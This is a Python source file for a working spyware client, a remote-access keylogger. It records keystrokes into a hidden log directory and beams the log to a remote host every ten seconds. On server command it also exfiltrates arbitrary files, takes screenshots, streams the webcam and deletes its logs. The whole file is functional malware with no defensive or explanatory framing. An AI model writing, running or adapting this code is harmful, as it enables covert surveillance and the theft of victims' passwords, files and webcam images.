import base64
import ctypes
import datetime
import io
import json
import logging
import os
import platform
import shutil
import socket
import sys
import threading
import time

import cv2
import dotenv
import pyautogui
from pynput.keyboard import Listener

# Global variables
stop = False
webcam_thread = None
LOG_DIR_WINDOWS = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'logs')
LOG_DIR_LINUX = '/tmp/logs'


# Function to get the OS
def get_os():
    return platform.system()


# Function to create a connection to the server
def create_connection(host, port):
    max_reconnect_time = 10 * 60
    reconnect_interval = 10
    start_time = time.time()
    while True:
        try:
            return socket.create_connection((host, port))
        except socket.error as e:
            if time.time() - start_time > max_reconnect_time:
                print(f"Max reconnect time reached: {max_reconnect_time} seconds")
                sys.exit(0)
            print(f"Error connecting to {host}:{port}: {e}")
            print(f"Retrying in {reconnect_interval} seconds...")
            time.sleep(reconnect_interval)


# Function to set up log file
def setup_logging(filename):
    if not os.path.exists(os.path.dirname(filename)):
        os.makedirs(os.path.dirname(filename))
    logging.basicConfig(
        filemode='a',
        filename=filename,
        datefmt='%Y-%m-%d %H:%M:%S',
        format='%(asctime)s %(message)s',
        level=logging.DEBUG
    )


# Function to hide directory
def hide_dir(dirname):
    if get_os() == 'Windows':
        ctypes.windll.kernel32.SetFileAttributesW(dirname, 2)
    elif get_os() == 'Linux':
        os.system(f'chattr +i {dirname}')
    else:
        print(f"Unknown OS: {get_os()}")
        sys.exit(0)


# Function to log key press
def log_key_press(key):
    logging.info(str(key))


# Function to send log message
def send_log_message(sock, filename):
    if not os.path.exists(filename):
        print(f"Log file not found: {filename}")
        return
    try:
        with open(filename, 'rb') as f:
            file_content_encoded = base64.b64encode(f.read()).decode()
            client_info = {
                'command': 'LOG',
                'filename': os.path.basename(filename),
                'file_content': file_content_encoded
            }
            json_data = json.dumps(client_info)
            sock.sendall(json_data.encode())
    except socket.error as e:
        print(f'Error sending log message: {e}')


# Function to capture and send webcam image
def capture_and_send_webcam(sock, stop_signal):
    cap = cv2.VideoCapture(0)

    while not stop_signal.is_set():
        ret, frame = cap.read()
        if not ret:
            break

        _, buffer = cv2.imencode('.jpg', frame)
        encoded_image = base64.b64encode(buffer).decode()

        client_info = {
            'command': 'WEBCAM',
            'image': encoded_image
        }
        json_data = json.dumps(client_info)
        try:
            sock.send(json_data.encode())
        except socket.error as e:
            print(f'Error sending webcam image: {e}')
            break

        time.sleep(0.1)

    cap.release()


# Function to receive commands from server
def receive_commands(sock):
    global webcam_thread
    stop_cam_signal = threading.Event()
    try:
        while True:
            data = sock.recv(1024)
            if not data:
                break
            data = data.decode()
            try:
                command = json.loads(data)
                command_type = command.get('command')

                if command_type == 'READ':
                    filename = command['filename']
                    try:
                        with open(filename, 'rb') as f:
                            file_content_encoded = base64.b64encode(f.read()).decode()

                            client_info = {
                                'command': 'READ',
                                'filename': filename,
                                'file_content': file_content_encoded
                            }
                            json_data = json.dumps(client_info)
                            sock.send(json_data.encode())
                    except FileNotFoundError:
                        client_info = {
                            'command': 'ERROR',
                            'error': f"File '{filename}' not found."
                        }
                        json_data = json.dumps(client_info)
                        sock.send(json_data.encode())

                elif command_type == 'SHOW':
                    files = os.listdir()
                    client_info = {
                        'command': 'SHOW',
                        'files': files
                    }
                    json_data = json.dumps(client_info)
                    sock.send(json_data.encode())

                elif command_type == 'SCREENSHOT':
                    screenshot = pyautogui.screenshot()
                    screenshot_bytes = io.BytesIO()
                    screenshot.save(screenshot_bytes, format='PNG')
                    screenshot_bytes = screenshot_bytes.getvalue()

                    screenshot_encoded = base64.b64encode(screenshot_bytes).decode()

                    client_info = {
                        'command': 'SCREENSHOT',
                        'screenshot': screenshot_encoded
                    }
                    json_data = json.dumps(client_info)
                    sock.send(json_data.encode())

                elif command_type == 'WEBCAM':
                    if webcam_thread is None or not webcam_thread.is_alive():
                        stop_cam_signal.clear()
                        webcam_thread = threading.Thread(target=capture_and_send_webcam, args=(sock, stop_cam_signal))
                        webcam_thread.start()
                    else:
                        stop_cam_signal.set()

                elif command_type == 'KILL':
                    global stop
                    stop = True
                    client_info = {
                        'command': 'KILL',
                        "stop": stop
                    }
                    json_data = json.dumps(client_info)
                    sock.send(json_data.encode())
                    logging.shutdown()

                    try:
                        log_dir = LOG_DIR_WINDOWS if get_os() == 'Windows' else LOG_DIR_LINUX
                        shutil.rmtree(log_dir)
                    except FileNotFoundError:
                        pass

            except json.JSONDecodeError as e:
                print(f"JSON decode error: {e}")
    except socket.error as e:
        print(f"Error receiving command: {e}")
        return


# Main function
def main():
    global stop
    dotenv.load_dotenv()
    host = os.getenv('HOST')
    port = int(os.getenv('PORT'))
    current_hour = datetime.datetime.now().strftime("%Hh")
    current_date = datetime.datetime.now().strftime("%d%m%Y")
    log_dir = LOG_DIR_WINDOWS if get_os() == 'Windows' else LOG_DIR_LINUX
    log_file = os.path.join(log_dir, f'{current_date}-{current_hour}.txt')

    setup_logging(log_file)
    hide_dir(log_dir)

    try:
        sock = create_connection(host, port)
        listener = Listener(on_press=log_key_press)
        listener.start()
        command_thread = threading.Thread(target=receive_commands, args=(sock,))
        command_thread.start()

        try:
            while not stop:
                send_log_message(sock, log_file)
                time.sleep(10)
            if stop:
                os.remove(log_file)
        except KeyboardInterrupt:
            if sock:
                sock.close()
            listener.stop()
            command_thread.join()
            os._exit(0)

    except socket.error as e:
        print(f"Connection error: {e}")
    finally:
        if sock:
            sock.close()
        listener.stop()
        command_thread.join()


if __name__ == '__main__':
    main()
